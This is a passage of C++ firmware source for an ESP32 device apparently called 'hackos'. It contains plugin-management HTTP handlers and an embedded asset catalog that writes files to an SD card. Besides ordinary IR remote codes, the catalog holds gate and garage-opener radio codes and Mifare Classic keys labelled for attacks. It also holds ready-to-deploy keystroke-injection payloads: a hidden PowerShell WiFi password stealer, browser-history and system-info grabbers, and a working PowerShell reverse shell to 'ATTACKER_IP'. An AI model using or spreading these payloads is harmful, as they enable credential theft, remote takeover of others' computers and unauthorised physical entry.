    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"error\":\"plugin not found\"}", 27);
}

/// POST /api/plugins/delete – delete a plugin file.
static esp_err_t httpApiPluginsDeleteHandler(httpd_req_t *req)
{
    char buf[256];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    const char *nameKey = strstr(buf, "\"name\"");
    if (nameKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing name\"}", 23);
    }

    const char *valStart = strchr(nameKey + 6, '"');
    if (valStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad format\"}", 21);
    }
    ++valStart;
    const char *valEnd = strchr(valStart, '"');
    if (valEnd == nullptr || (valEnd - valStart) >= 32)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad name\"}", 20);
    }

    char pluginName[32];
    size_t pnLen = static_cast<size_t>(valEnd - valStart);
    memcpy(pluginName, valStart, pnLen);
    pluginName[pnLen] = '\0';

    // Validate: no path traversal in plugin name
    if (strstr(pluginName, "..") != nullptr || strchr(pluginName, '/') != nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"invalid name\"}", 23);
    }

    auto &pm = hackos::core::PluginManager::instance();
    if (pm.deletePlugin(pluginName))
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"ok\":true}", 11);
    }

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"error\":\"delete failed\"}", 24);
}

/// POST /api/plugins/reload – reload plugins from SD card.
static esp_err_t httpApiPluginsReloadHandler(httpd_req_t *req)
{
    auto &pm = hackos::core::PluginManager::instance();
    size_t loaded = pm.reload();

    char json[64];
    snprintf(json, sizeof(json), "{\"ok\":true,\"loaded\":%u}",
             static_cast<unsigned>(loaded));

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, strlen(json));
}

// ═══════════════════════════════════════════════════════════════════════════════
// Universal Signal Lab – Embedded Asset Database
// ═══════════════════════════════════════════════════════════════════════════════

// ── IR Remote Databases ──────────────────────────────────────────────────────

static const char ASSET_IR_TV[] =
    "Filetype: IR signals file\n"
    "Version: 1\n"
    "#\n"
    "# Universal TV Remote - Samsung, LG, Sony, Panasonic, Vizio, TCL, Hisense\n"
    "#\n"
    "name: Power_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 02 02 00 00\n"
    "#\n"
    "name: Vol_Up_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 07 07 00 00\n"
    "#\n"
    "name: Vol_Down_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 0B 0B 00 00\n"
    "#\n"
    "name: Ch_Up_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 12 12 00 00\n"
    "#\n"
    "name: Ch_Down_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 10 10 00 00\n"
    "#\n"
    "name: Mute_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 0F 0F 00 00\n"
    "#\n"
    "name: Input_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 07 07 00 00\n"
    "command: 01 01 00 00\n"
    "#\n"
    "name: Power_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 08 00 00 00\n"
    "#\n"
    "name: Vol_Up_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 02 00 00 00\n"
    "#\n"
    "name: Vol_Down_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 03 00 00 00\n"
    "#\n"
    "name: Ch_Up_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 00 00 00 00\n"
    "#\n"
    "name: Ch_Down_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 01 00 00 00\n"
    "#\n"
    "name: Mute_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 09 00 00 00\n"
    "#\n"
    "name: Power_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 15 00 00 00\n"
    "#\n"
    "name: Vol_Up_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 12 00 00 00\n"
    "#\n"
    "name: Vol_Down_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 13 00 00 00\n"
    "#\n"
    "name: Ch_Up_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 10 00 00 00\n"
    "#\n"
    "name: Ch_Down_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 11 00 00 00\n"
    "#\n"
    "name: Mute_Sony\n"
    "type: parsed\n"
    "protocol: SIRC\n"
    "address: 01 00 00 00\n"
    "command: 14 00 00 00\n"
    "#\n"
    "name: Power_Panasonic\n"
    "type: parsed\n"
    "protocol: Kaseikyo\n"
    "address: 00 20 00 00\n"
    "command: 3D 00 00 00\n"
    "#\n"
    "name: Vol_Up_Panasonic\n"
    "type: parsed\n"
    "protocol: Kaseikyo\n"
    "address: 00 20 00 00\n"
    "command: 20 00 00 00\n"
    "#\n"
    "name: Vol_Down_Panasonic\n"
    "type: parsed\n"
    "protocol: Kaseikyo\n"
    "address: 00 20 00 00\n"
    "command: 21 00 00 00\n"
    "#\n"
    "name: Power_Vizio\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 08 00 00\n"
    "command: 08 00 00 00\n"
    "#\n"
    "name: Power_TCL\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 40 00 00 00\n"
    "command: 12 00 00 00\n"
    "#\n"
    "name: Power_Hisense\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 00 BF 00 00\n"
    "command: 02 00 00 00\n"
    "#\n"
    "name: Power_Philips\n"
    "type: parsed\n"
    "protocol: RC5\n"
    "address: 00 00 00 00\n"
    "command: 0C 00 00 00\n"
    "#\n"
    "name: Power_Sharp\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 45 00 00 00\n"
    "command: 40 00 00 00\n"
    "#\n"
    "name: Power_Toshiba\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 40 BF 00 00\n"
    "command: 12 00 00 00\n";

static const char ASSET_IR_AC[] =
    "Filetype: IR signals file\n"
    "Version: 1\n"
    "#\n"
    "# Universal AC Remote - Gree, Daikin, Mitsubishi, LG, Samsung, Carrier\n"
    "#\n"
    "name: AC_On_Gree_Cool_24C\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 9000 4500 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 1690 560 38000\n"
    "#\n"
    "name: AC_Off_Gree\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 9000 4500 560 560 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 1690 560 1690 560 560 560 1690 560 560 560 1690 560 38000\n"
    "#\n"
    "name: AC_On_Daikin_Cool_22C\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 3450 1750 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 1300 430 1300 430 430 430 430 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 430 430 1300 430 1300 430 430 430 430 430 1300 430 1300 430 430 430 1300 430 430 430 1300 430 35000\n"
    "#\n"
    "name: AC_Off_Daikin\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 3450 1750 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 1300 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 1300 430 430 430 430 430 1300 430 1300 430 430 430 1300 430 430 430 1300 430 35000\n"
    "#\n"
    "name: AC_On_Mitsubishi_Cool_24C\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 3400 1750 450 1300 450 450 450 1300 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 450 450 1300 450 450 450 450 450 1300 450 450 450 1300 450 450 450 450 450 450 450 450 450 450 450 1300 450 1300 450 450 450 450 450 1300 450 1300 450 450 450 1300 450 450 450 1300 450 35000\n"
    "#\n"
    "name: AC_Off_Mitsubishi\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 3400 1750 450 1300 450 450 450 1300 450 450 450 450 450 450 450 1300 450 450 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 1300 450 450 450 1300 450 450 450 1300 450 35000\n"
    "#\n"
    "name: AC_On_LG_Cool_24C\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: 08 00 00 00\n"
    "#\n"
    "name: AC_Off_LG\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 04 00 00 00\n"
    "command: C0 05 00 00\n"
    "#\n"
    "name: AC_On_Samsung_Cool_24C\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 01 00 00 00\n"
    "command: E0 18 00 00\n"
    "#\n"
    "name: AC_Off_Samsung\n"
    "type: parsed\n"
    "protocol: Samsung32\n"
    "address: 01 00 00 00\n"
    "command: E0 19 00 00\n"
    "#\n"
    "name: AC_On_Carrier_Cool_24C\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 8950 4500 560 1690 560 560 560 1690 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 560 560 1690 560 38000\n"
    "#\n"
    "name: AC_Off_Carrier\n"
    "type: raw\n"
    "frequency: 38000\n"
    "duty_cycle: 0.330000\n"
    "data: 8950 4500 560 560 560 560 560 1690 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 560 560 1690 560 38000\n";

static const char ASSET_IR_PROJECTOR[] =
    "Filetype: IR signals file\n"
    "Version: 1\n"
    "#\n"
    "# Universal Projector Remote - Epson, BenQ, Optoma, ViewSonic, Acer\n"
    "#\n"
    "name: Power_Epson\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 05 00 00 00\n"
    "command: 03 00 00 00\n"
    "#\n"
    "name: Menu_Epson\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 05 00 00 00\n"
    "command: 04 00 00 00\n"
    "#\n"
    "name: Source_Epson\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 05 00 00 00\n"
    "command: 15 00 00 00\n"
    "#\n"
    "name: Power_BenQ\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 30 00 00 00\n"
    "command: 0A 00 00 00\n"
    "#\n"
    "name: Menu_BenQ\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 30 00 00 00\n"
    "command: 0D 00 00 00\n"
    "#\n"
    "name: Source_BenQ\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 30 00 00 00\n"
    "command: 09 00 00 00\n"
    "#\n"
    "name: Power_Optoma\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 44 00 00 00\n"
    "command: 02 00 00 00\n"
    "#\n"
    "name: Power_ViewSonic\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 03 00 00 00\n"
    "command: 0E 00 00 00\n"
    "#\n"
    "name: Power_Acer\n"
    "type: parsed\n"
    "protocol: NEC\n"
    "address: 01 00 00 00\n"
    "command: 01 00 00 00\n";

// ── Sub-GHz Databases ────────────────────────────────────────────────────────

static const char ASSET_SUBGHZ_CAME[] =
    "Filetype: Flipper SubGhz Key File\n"
    "Version: 1\n"
    "# CAME 12-bit (433.92 MHz) - Common gate opener codes\n"
    "Frequency: 433920000\n"
    "Preset: FuriHalSubGhzPresetOok650Async\n"
    "Protocol: CAME\n"
    "Bit: 12\n"
    "Key: 00 00 00 00 00 00 01 11\n"
    "# Alternate common codes:\n"
    "# Key: 00 00 00 00 00 00 02 22\n"
    "# Key: 00 00 00 00 00 00 03 33\n"
    "# Key: 00 00 00 00 00 00 05 55\n"
    "# Key: 00 00 00 00 00 00 08 88\n"
    "# Key: 00 00 00 00 00 00 0A AA\n"
    "# Key: 00 00 00 00 00 00 0F FF\n";

static const char ASSET_SUBGHZ_NICE[] =
    "Filetype: Flipper SubGhz Key File\n"
    "Version: 1\n"
    "# Nice FLO 12-bit (433.92 MHz) - Gate/barrier remote\n"
    "Frequency: 433920000\n"
    "Preset: FuriHalSubGhzPresetOok650Async\n"
    "Protocol: Nice FLO\n"
    "Bit: 12\n"
    "Key: 00 00 00 00 00 00 01 00\n"
    "# Alternate common codes:\n"
    "# Key: 00 00 00 00 00 00 02 00\n"
    "# Key: 00 00 00 00 00 00 04 00\n"
    "# Key: 00 00 00 00 00 00 08 00\n"
    "# Key: 00 00 00 00 00 00 0F 00\n";

static const char ASSET_SUBGHZ_LINEAR[] =
    "Filetype: Flipper SubGhz Key File\n"
    "Version: 1\n"
    "# Linear 10-bit (310 MHz) - Garage door opener\n"
    "Frequency: 310000000\n"
    "Preset: FuriHalSubGhzPresetOok650Async\n"
    "Protocol: Linear\n"
    "Bit: 10\n"
    "Key: 00 00 00 00 00 00 03 FF\n"
    "# Common DIP switch patterns:\n"
    "# Key: 00 00 00 00 00 00 02 AA\n"
    "# Key: 00 00 00 00 00 00 01 55\n"
    "# Key: 00 00 00 00 00 00 03 00\n"
    "# Key: 00 00 00 00 00 00 00 FF\n";

static const char ASSET_SUBGHZ_PRINCETON[] =
    "Filetype: Flipper SubGhz Key File\n"
    "Version: 1\n"
    "# Princeton 24-bit (433.92 MHz) - Generic remote control\n"
    "Frequency: 433920000\n"
    "Preset: FuriHalSubGhzPresetOok650Async\n"
    "Protocol: Princeton\n"
    "Bit: 24\n"
    "Key: 00 00 00 00 00 11 22 10\n"
    "# Common patterns:\n"
    "# Key: 00 00 00 00 00 55 55 50\n"
    "# Key: 00 00 00 00 00 AA AA A0\n"
    "# Key: 00 00 00 00 00 FF FF F0\n";

static const char ASSET_SUBGHZ_CHAMBERLAIN[] =
    "Filetype: Flipper SubGhz Key File\n"
    "Version: 1\n"
    "# Chamberlain/LiftMaster 9-bit (390 MHz) - Garage door\n"
    "Frequency: 390000000\n"
    "Preset: FuriHalSubGhzPresetOok650Async\n"
    "Protocol: Chamberlain\n"
    "Bit: 9\n"
    "Key: 00 00 00 00 00 00 01 00\n"
    "# Common codes:\n"
    "# Key: 00 00 00 00 00 00 01 10\n"
    "# Key: 00 00 00 00 00 00 01 20\n"
    "# Key: 00 00 00 00 00 00 01 30\n";

// ── NFC Databases ────────────────────────────────────────────────────────────

static const char ASSET_NFC_MIFARE_KEYS[] =
    "# Mifare Classic Default & Known Keys Database\n"
    "# Format: One key per line (12 hex chars = 6 bytes)\n"
    "# Use with key-based attacks against Mifare Classic 1K/4K\n"
    "#\n"
    "# Factory default keys\n"
    "FFFFFFFFFFFF\n"
    "A0A1A2A3A4A5\n"
    "D3F7D3F7D3F7\n"
    "000000000000\n"
    "B0B1B2B3B4B5\n"
    "4D3A99C351DD\n"
    "1A982C7E459A\n"
    "AABBCCDDEEFF\n"
    "714C5C886E97\n"
    "587EE5F9350F\n"
    "A0478CC39091\n"
    "533CB6C723F6\n"
    "8FD0A4F256E9\n"
    "#\n"
    "# Common transport/hotel/access keys\n"
    "0297927C0F77\n"
    "EE0042F88840\n"
    "484558414354\n"
    "A22AE129C013\n"
    "49FAE4E3849F\n"
    "38FCF33072E0\n"
    "5C598C9C58B5\n"
    "E4D2770A89BE\n"
    "7A396F0D633D\n"
    "FC00018778F7\n"
    "54726F6E696B\n"
    "8A1AAB75C880\n"
    "B3A2AAF0C4E5\n"
    "514365656E20\n"
    "1FC2354DBBE7\n"
    "E823B3BBE5E6\n";

static const char ASSET_NFC_AMIIBO_TEMPLATE[] =
    "Filetype: Flipper NFC device\n"
    "Version: 4\n"
    "# NTAG215 Amiibo Template - 540 bytes\n"
    "Device type: NTAG215\n"
    "UID: 04 FF FF FF FF FF FF\n"
    "ATQA: 44 00\n"
    "SAK: 00\n"
    "# Page data (135 pages x 4 bytes)\n"
    "# Pages 0-3: UID/Internal/Lock\n"
    "Page 0: 04 FF FF FF\n"
    "Page 1: FF FF FF FF\n"
    "Page 2: FF 48 00 00\n"
    "Page 3: E1 10 3E 00\n"
    "# Pages 4-129: User data (Amiibo payload)\n"
    "Page 4: 03 00 FE 00\n"
    "# Pages 130-134: Dynamic lock/config\n"
    "Page 130: 00 00 00 BD\n"
    "Page 131: 04 00 00 FF\n"
    "Page 132: 00 05 00 00\n"
    "Page 133: 00 00 00 00\n"
    "Page 134: 00 00 00 00\n";

// ── DuckyScript Payloads ─────────────────────────────────────────────────────

static const char ASSET_DUCKY_WIFI_STEALER[] =
    "REM WiFi Password Extractor (Windows)\n"
    "REM Extracts saved WiFi profiles and passwords\n"
    "TARGET WINDOWS\n"
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell -WindowStyle Hidden -Command \"\n"
    "ENTER\n"
    "DELAY 1000\n"
    "STRING $out = '';\n"
    "ENTER\n"
    "STRING (netsh wlan show profiles) | Select-String 'All User' | ForEach-Object {\n"
    "ENTER\n"
    "STRING   $p = ($_ -split ':')[1].Trim();\n"
    "ENTER\n"
    "STRING   $k = ((netsh wlan show profile name=$p key=clear) | Select-String 'Key Content');\n"
    "ENTER\n"
    "STRING   if($k){ $out += $p + ': ' + ($k -split ':')[1].Trim() + \\\"`n\\\" }\n"
    "ENTER\n"
    "STRING };\n"
    "ENTER\n"
    "STRING $out | Out-File -FilePath $env:USERPROFILE\\wifi_keys.txt;\n"
    "ENTER\n"
    "STRING \"\n"
    "ENTER\n";

static const char ASSET_DUCKY_CHROME_HISTORY[] =
    "REM Chrome Browsing History Extractor (Windows)\n"
    "REM Copies Chrome history database for offline analysis\n"
    "TARGET WINDOWS\n"
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING cmd /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History\" \"%USERPROFILE%\\Desktop\\chrome_hist.db\" /Y\n"
    "ENTER\n"
    "DELAY 2000\n"
    "REM History file is an SQLite DB, open with DB Browser for SQLite\n";

static const char ASSET_DUCKY_REVERSE_SHELL[] =
    "REM PowerShell Reverse Shell (Windows)\n"
    "REM Connects back to attacker listener (change IP/PORT)\n"
    "TARGET WINDOWS\n"
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n"
    "ENTER\n";

static const char ASSET_DUCKY_SYSINFO[] =
    "REM System Info Grabber (Windows)\n"
    "REM Collects OS, network, user and hardware info\n"
    "TARGET WINDOWS\n"
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell -WindowStyle Hidden -Command \"\n"
    "ENTER\n"
    "DELAY 800\n"
    "STRING $r = '=== SYSTEM INFO ===' + \\\"`n\\\";\n"
    "ENTER\n"
    "STRING $r += (systeminfo | Out-String);\n"
    "ENTER\n"
    "STRING $r += '=== NETWORK ===' + \\\"`n\\\";\n"
    "ENTER\n"
    "STRING $r += (ipconfig /all | Out-String);\n"
    "ENTER\n"
    "STRING $r += '=== USERS ===' + \\\"`n\\\";\n"
    "ENTER\n"
    "STRING $r += (net user | Out-String);\n"
    "ENTER\n"
    "STRING $r += '=== ARP TABLE ===' + \\\"`n\\\";\n"
    "ENTER\n"
    "STRING $r += (arp -a | Out-String);\n"
    "ENTER\n"
    "STRING $r | Out-File $env:USERPROFILE\\sysinfo.txt;\n"
    "ENTER\n"
    "STRING \"\n"
    "ENTER\n";

static const char ASSET_DUCKY_EXFIL_MACRO[] =
    "REM Macro-based Data Exfiltration (Windows)\n"
    "REM Exfiltrates recent documents list via PowerShell\n"
    "TARGET WINDOWS\n"
    "DELAY 1000\n"
    "GUI r\n"
    "DELAY 500\n"
    "STRING powershell -WindowStyle Hidden -Command \"\n"
    "ENTER\n"
    "DELAY 800\n"
    "STRING Get-ChildItem -Path $env:USERPROFILE\\Documents -Recurse -File |\n"
    "ENTER\n"
    "STRING   Select-Object Name, Length, LastWriteTime |\n"
    "ENTER\n"
    "STRING   Export-Csv -Path $env:USERPROFILE\\doc_list.csv -NoTypeInformation;\n"
    "ENTER\n"
    "STRING \"\n"
    "ENTER\n";

// ── Asset Catalog ────────────────────────────────────────────────────────────

struct AssetEntry
{
    const char *id;
    const char *category;
    const char *name;
    const char *desc;
    const char *filename;
    const char *destDir;
    const char *content;
    size_t contentLen;
};

static const AssetEntry ASSET_CATALOG[] = {
    // IR Remotes
    {"ir_tv_universal",   "ir", "Universal TV Remote",
     "Samsung, LG, Sony, Panasonic, Vizio, TCL, Hisense, Philips, Sharp, Toshiba power/vol/ch codes",
     "tv_universal.ir", "/ext/assets/ir", ASSET_IR_TV, sizeof(ASSET_IR_TV) - 1},

    {"ir_ac_universal",   "ir", "Universal AC Remote",
     "Gree, Daikin, Mitsubishi, LG, Samsung, Carrier on/off codes with temperature presets",
     "ac_universal.ir", "/ext/assets/ir", ASSET_IR_AC, sizeof(ASSET_IR_AC) - 1},

    {"ir_projector",      "ir", "Universal Projector Remote",
     "Epson, BenQ, Optoma, ViewSonic, Acer power/menu/source codes",
     "projector_universal.ir", "/ext/assets/ir", ASSET_IR_PROJECTOR, sizeof(ASSET_IR_PROJECTOR) - 1},

    // Sub-GHz
    {"subghz_came",       "subghz", "CAME 12-bit",
     "CAME gate opener 433.92 MHz OOK - common 12-bit fixed codes",
     "came_12bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_CAME, sizeof(ASSET_SUBGHZ_CAME) - 1},

    {"subghz_nice",       "subghz", "Nice FLO 12-bit",
     "Nice FLO gate/barrier remote 433.92 MHz OOK - 12-bit fixed codes",
     "nice_flo_12bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_NICE, sizeof(ASSET_SUBGHZ_NICE) - 1},

    {"subghz_linear",     "subghz", "Linear 10-bit",
     "Linear garage door opener 310 MHz OOK - 10-bit DIP switch codes",
     "linear_10bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_LINEAR, sizeof(ASSET_SUBGHZ_LINEAR) - 1},

    {"subghz_princeton",  "subghz", "Princeton 24-bit",
     "Princeton generic remote 433.92 MHz OOK - 24-bit fixed codes",
     "princeton_24bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_PRINCETON, sizeof(ASSET_SUBGHZ_PRINCETON) - 1},

    {"subghz_chamberlain","subghz", "Chamberlain/LiftMaster",
     "Chamberlain garage 390 MHz - 9-bit codes for older fixed-code models",
     "chamberlain_9bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_CHAMBERLAIN, sizeof(ASSET_SUBGHZ_CHAMBERLAIN) - 1},

    // NFC
    {"nfc_mifare_keys",   "nfc", "Mifare Classic Default Keys",
     "30+ known factory and transport system default keys for Mifare Classic 1K/4K attacks",
     "mifare_default_keys.txt", "/ext/nfc", ASSET_NFC_MIFARE_KEYS, sizeof(ASSET_NFC_MIFARE_KEYS) - 1},

    {"nfc_amiibo_tpl",    "nfc", "Amiibo NTAG215 Template",
     "Blank NTAG215 template structure for Amiibo emulation - fill with payload data",
     "amiibo_template.nfc", "/ext/nfc/amiibo", ASSET_NFC_AMIIBO_TEMPLATE, sizeof(ASSET_NFC_AMIIBO_TEMPLATE) - 1},

    // DuckyScript Payloads
    {"ducky_wifi_steal",  "ducky", "WiFi Password Extractor",
     "Extracts all saved WiFi SSIDs and passwords on Windows via netsh/PowerShell",
     "wifi_stealer_win.txt", "/ext/payloads", ASSET_DUCKY_WIFI_STEALER, sizeof(ASSET_DUCKY_WIFI_STEALER) - 1},

    {"ducky_chrome_hist", "ducky", "Chrome History Extractor",
     "Copies Chrome browsing history SQLite DB to Desktop for offline analysis",
     "chrome_history_win.txt", "/ext/payloads", ASSET_DUCKY_CHROME_HISTORY, sizeof(ASSET_DUCKY_CHROME_HISTORY) - 1},

    {"ducky_rev_shell",   "ducky", "Reverse Shell Injector",
     "PowerShell TCP reverse shell - change ATTACKER_IP and PORT before use",
     "reverse_shell_win.txt", "/ext/payloads", ASSET_DUCKY_REVERSE_SHELL, sizeof(ASSET_DUCKY_REVERSE_SHELL) - 1},

    {"ducky_sysinfo",     "ducky", "System Info Grabber",
     "Collects OS version, network config, users, and ARP table on Windows",
     "sysinfo_grab_win.txt", "/ext/payloads", ASSET_DUCKY_SYSINFO, sizeof(ASSET_DUCKY_SYSINFO) - 1},

    {"ducky_exfil_docs",  "ducky", "Document List Exfiltrator",
     "Enumerates all files in Documents folder with sizes and dates to CSV",
     "exfil_docs_win.txt", "/ext/payloads", ASSET_DUCKY_EXFIL_MACRO, sizeof(ASSET_DUCKY_EXFIL_MACRO) - 1},
};

static constexpr size_t ASSET_COUNT = sizeof(ASSET_CATALOG) / sizeof(ASSET_CATALOG[0]);

// ═══════════════════════════════════════════════════════════════════════════════
// Signal Lab API Handlers
// ═══════════════════════════════════════════════════════════════════════════════

static constexpr size_t ASSET_ID_MAX = 64U;

/// GET /api/assets – list the embedded asset catalog (no content).
static esp_err_t httpApiAssetsHandler(httpd_req_t *req)
{
    static constexpr size_t ASSETS_JSON_SIZE = 4096U;
    char json[ASSETS_JSON_SIZE];
    size_t offset = 0U;
    offset += snprintf(json + offset, sizeof(json) - offset, "{\"assets\":[");

    for (size_t i = 0U; i < ASSET_COUNT && offset < sizeof(json) - 256U; ++i)
    {
        const auto &a = ASSET_CATALOG[i];
        if (i > 0U)
        {
            offset += snprintf(json + offset, sizeof(json) - offset, ",");
        }
        offset += snprintf(json + offset, sizeof(json) - offset,
                           "{\"id\":\"%s\",\"category\":\"%s\",\"name\":\"%s\","
                           "\"desc\":\"%s\",\"filename\":\"%s\",\"size\":%u}",
                           a.id, a.category, a.name, a.desc, a.filename,
                           static_cast<unsigned>(a.contentLen));
    }
    offset += snprintf(json + offset, sizeof(json) - offset, "]}");

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, json, offset);
}

/// POST /api/assets/deploy – write an embedded asset file to the SD card.
static esp_err_t httpApiAssetsDeployHandler(httpd_req_t *req)
{
    char buf[256];
    int received = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (received <= 0)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"no body\"}", 19);
    }
    buf[received] = '\0';

    // Parse "id" field
    const char *idKey = strstr(buf, "\"id\"");
    if (idKey == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"missing id\"}", 21);
    }

    const char *valStart = strchr(idKey + 4, '"');
    if (valStart == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad format\"}", 21);
    }
    ++valStart;
    const char *valEnd = strchr(valStart, '"');
    if (valEnd == nullptr || static_cast<size_t>(valEnd - valStart) >= ASSET_ID_MAX)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"bad id\"}", 18);
    }

    char assetId[ASSET_ID_MAX];
    size_t idLen = static_cast<size_t>(valEnd - valStart);
    memcpy(assetId, valStart, idLen);
    assetId[idLen] = '\0';

    // Find asset in catalog
    const AssetEntry *found = nullptr;
    for (size_t i = 0U; i < ASSET_COUNT; ++i)
    {
        if (strcmp(ASSET_CATALOG[i].id, assetId) == 0)
        {
            found = &ASSET_CATALOG[i];
            break;
        }
    }

    if (found == nullptr)
    {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, "{\"error\":\"asset not found\"}", 26);
    }

    // Build destination path
    char path[128];
    snprintf(path, sizeof(path), "%s/%s", found->destDir, found->filename);

    // Ensure destination directory exists
    auto &vfs = hackos::storage::VirtualFS::instance();
    if (!vfs.exists(found->destDir))
    {
        vfs.mkdir(found->destDir);
    }

    // Write asset content to file
    fs::File file = vfs.open(path, "w");
    if (!file)
    {
